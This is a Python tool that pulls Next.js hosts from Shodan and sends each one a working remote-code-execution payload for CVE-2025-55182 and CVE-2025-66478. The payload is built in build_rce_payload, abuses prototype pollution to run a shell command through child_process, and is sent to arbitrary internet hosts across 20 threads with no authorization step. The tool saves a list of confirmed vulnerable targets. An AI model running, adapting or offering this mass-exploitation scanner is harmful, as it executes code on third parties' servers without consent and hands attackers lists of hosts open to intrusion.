#!/usr/bin/env python3
"""
Shodan Scanner - CVE-2025-55182 & CVE-2025-66478
"""

import sys
import json
import time
import re
import secrets
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Set
from pathlib import Path

try:
    import shodan
except ImportError:
    print("  Shodan library not found")
    print("  Install: pip install shodan")
    sys.exit(1)

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("  Requests library not found")
    print("  Install: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("  tqdm library not found")
    print("  Install: pip install tqdm")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Load environment variables
def load_env():
    """Load environment variables from .env file"""
    possible_paths = [
        Path(__file__).parent.parent / '.env',
        Path(__file__).parent / '.env',
        Path.cwd() / '.env',
    ]
    
    env_vars = {}
    for env_path in possible_paths:
        if env_path.exists():
            with open(env_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        key, value = line.split('=', 1)
                        env_vars[key.strip()] = value.strip()
            break
    return env_vars

# Load Shodan queries from file
def load_shodan_queries(queries_file: str = 'shodan_queries.txt') -> List[str]:
    """Load Shodan queries from a text file"""
    queries = []
    
    possible_paths = [
        Path(__file__).parent.parent / queries_file,
        Path(__file__).parent / queries_file,
        Path.cwd() / queries_file,
    ]
    
    queries_path = None
    for path in possible_paths:
        if path.exists():
            queries_path = path
            break
    
    if not queries_path:
        # Return default queries if file not found
        return [
            'http.html:"__NEXT_DATA__"',
            'http.html:"_next/static"',
            'http.html:"next-head-count"',
            'http.component:"Next.js"',
            'http.title:"Next.js"',
            'http.html:"/_next/data/"',
            'http.html:"self.__next"',
            'http.html:"__NEXT_LOADED_PAGES__"',
        ]
    
    with open(queries_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                queries.append(line)
    
    return queries

# Load configuration
env_vars = load_env()
SHODAN_API_KEY = env_vars.get('SHODAN_API_KEY', os.getenv('SHODAN_API_KEY', ''))
RESULTS_PER_QUERY = 100
SCAN_THREADS = 20
REQUEST_TIMEOUT = 10

SHODAN_QUERIES = load_shodan_queries()


class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║          RSC Security Tool - Shodan Scanner               ║
║           CVE-2025-55182 & CVE-2025-66478                 ║
║                    Emre Davut                             ║ 
╚═══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)


def search_shodan(api_key: str, query: str, limit: int = 100) -> List[Dict]:
    try:
        api = shodan.Shodan(api_key)
        results = api.search(query, limit=limit)
        return results['matches']
    except shodan.APIError:
        return []
    except Exception:
        return []


def extract_targets(matches: List[Dict]) -> Set[str]:
    targets = set()
    
    for match in matches:
        ip = match.get('ip_str', '')
        port = match.get('port', 80)
        hostnames = match.get('hostnames', [])
        
        is_ssl = port == 443 or 'ssl' in match.get('tags', [])
        protocol = 'https' if is_ssl else 'http'
        
        # Prefer hostnames if available
        for hostname in hostnames:
            if hostname:
                url = f"{protocol}://{hostname}" if port in [80, 443] else f"{protocol}://{hostname}:{port}"
                targets.add(url)
        
        # Fallback to IP if no hostnames
        if not hostnames and ip:
            url = f"{protocol}://{ip}" if port in [80, 443] else f"{protocol}://{ip}:{port}"
            targets.add(url)
    
    return targets


def build_rce_payload() -> tuple:
    # Random boundary for security (4 dashes at start)
    boundary = f"----WebKitFormBoundary{secrets.token_hex(8)}"
    cmd = 'echo $((41*271))'
    
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )
    
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    
    parts = []
    # Add 2 more dashes (total 6 dashes for multipart boundaries)
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append(f"--{boundary}--")
    
    body = "".join(parts)
    # Content-Type uses boundary WITHOUT the extra dashes
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def check_vulnerability(url: str) -> Dict:
    result = {
        'url': url,
        'vulnerable': False,
        'status': None,
        'error': None
    }
    
    try:
        body, content_type = build_rce_payload()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': secrets.token_hex(4),
            'Content-Type': content_type,
            'X-Nextjs-Html-Request-Id': secrets.token_hex(8),
        }
        
        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
        
        response = requests.post(
            f"{url}/",
            headers=headers,
            data=body_bytes,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            allow_redirects=False
        )
        
        result['status'] = response.status_code
        
        redirect_header = response.headers.get('X-Action-Redirect', '')
        if re.search(r'.*/login\?a=11111.*', redirect_header):
            result['vulnerable'] = True
        
    except requests.exceptions.SSLError as e:
        result['error'] = f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        result['error'] = f"Connection Error: {str(e)}"
    except requests.exceptions.Timeout:
        result['error'] = "Request timed out"
    except RequestException as e:
        result['error'] = f"Request failed: {str(e)}"
    except Exception as e:
        result['error'] = f"Unexpected error: {str(e)}"
    
    return result


def scan_targets(targets: List[str], threads: int = 20) -> tuple:
    vulnerable = []
    not_vulnerable = []
    errors = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_vulnerability, target): target for target in targets}
        
        with tqdm(total=len(targets), desc=f"{Colors.CYAN}Scanning{Colors.RESET}", 
                 unit="target", ncols=80) as pbar:
            for future in as_completed(futures):
                result = future.result()
                
                if result['vulnerable']:
                    vulnerable.append(result['url'])
                    tqdm.write(f"{Colors.GREEN}✓ VULNERABLE{Colors.RESET} {result['url']}")
                elif result['error']:
                    errors.append(result)
                else:
                    not_vulnerable.append(result['url'])
                
                pbar.update(1)
    
    return vulnerable, not_vulnerable, errors


def save_results(vulnerable: List[str], filename):
    try:
        with open(filename, 'w') as f:
            for url in vulnerable:
                f.write(f"{url}\n")
        return True
    except Exception:
        return False


def save_detailed_report(data: Dict, filename):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception:
        return False


def main():
    print_banner()
    
    # Check API key
    if not SHODAN_API_KEY:
        print(f"{Colors.RED}[✗] Error: SHODAN_API_KEY not found{Colors.RESET}")
        print(f"{Colors.YELLOW}[i] Please set your Shodan API key in .env file{Colors.RESET}")
        sys.exit(1)
    
    # Create results directory
    results_dir = Path(__file__).parent.parent / 'results'
    results_dir.mkdir(exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = results_dir / f"vulnerable_{timestamp}.txt"
    report_file = results_dir / f"report_{timestamp}.json"
    
    print(f"{Colors.CYAN}[1/4] Initializing Shodan API{Colors.RESET}")
    print(f"      API Key: {SHODAN_API_KEY[:10]}...{SHODAN_API_KEY[-5:]}")
    print(f"\n{Colors.CYAN}[2/4] Collecting targets from Shodan{Colors.RESET}")
    all_matches = []
    all_targets = set()
    
    for i, query in enumerate(SHODAN_QUERIES, 1):
        print(f"      [{i}/{len(SHODAN_QUERIES)}] {query[:50]}...", end=' ')
        
        matches = search_shodan(SHODAN_API_KEY, query, RESULTS_PER_QUERY)
        
        if matches:
            all_matches.extend(matches)
            targets = extract_targets(matches)
            all_targets.update(targets)
            print(f"{Colors.GREEN} {len(targets)} targets{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW} No results{Colors.RESET}")
        
        if i < len(SHODAN_QUERIES):
            time.sleep(1)
    
    print(f"\n      {Colors.BOLD}Total unique targets: {len(all_targets)}{Colors.RESET}")
    
    if not all_targets:
        print(f"\n{Colors.RED} No targets found{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}[3/4] Scanning for vulnerabilities{Colors.RESET}")
    print(f"      Threads: {SCAN_THREADS} | Timeout: {REQUEST_TIMEOUT}s\n")
    
    vulnerable, not_vulnerable, errors = scan_targets(
        sorted(all_targets), 
        threads=SCAN_THREADS
    )
    
    print(f"\n{Colors.CYAN}[4/4] Saving results{Colors.RESET}")
    
    if vulnerable:
        if save_results(vulnerable, output_file):
            print(f"      {Colors.GREEN} Vulnerable targets: {output_file}{Colors.RESET}")
    
    report_data = {
        'scan_time': datetime.now().isoformat(),
        'total_targets': len(all_targets),
        'vulnerable_count': len(vulnerable),
        'not_vulnerable_count': len(not_vulnerable),
        'error_count': len(errors),
        'vulnerable_targets': vulnerable,
        'shodan_queries': SHODAN_QUERIES,
        'cve': ['CVE-2025-55182', 'CVE-2025-66478']
    }
    
    if save_detailed_report(report_data, report_file):
        print(f"      {Colors.GREEN}✓ Detailed report: {report_file}{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}SCAN SUMMARY{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"  Total targets scanned: {len(all_targets)}")
    
    if vulnerable:
        print(f"  {Colors.RED}{Colors.BOLD}Vulnerable: {len(vulnerable)}{Colors.RESET}")
    else:
        print("  Vulnerable: 0")
    
    print(f"  Not vulnerable: {len(not_vulnerable)}")
    print(f"  Errors: {len(errors)}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    
    if vulnerable:
        print(f"\n{Colors.GREEN} Found {len(vulnerable)} vulnerable target(s)!{Colors.RESET}")
        print(f"  Results saved to: {output_file}")
    else:
        print(f"\n{Colors.YELLOW}No vulnerable targets found{Colors.RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW} Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED} Unexpected error: {e}{Colors.RESET}")
        sys.exit(1)
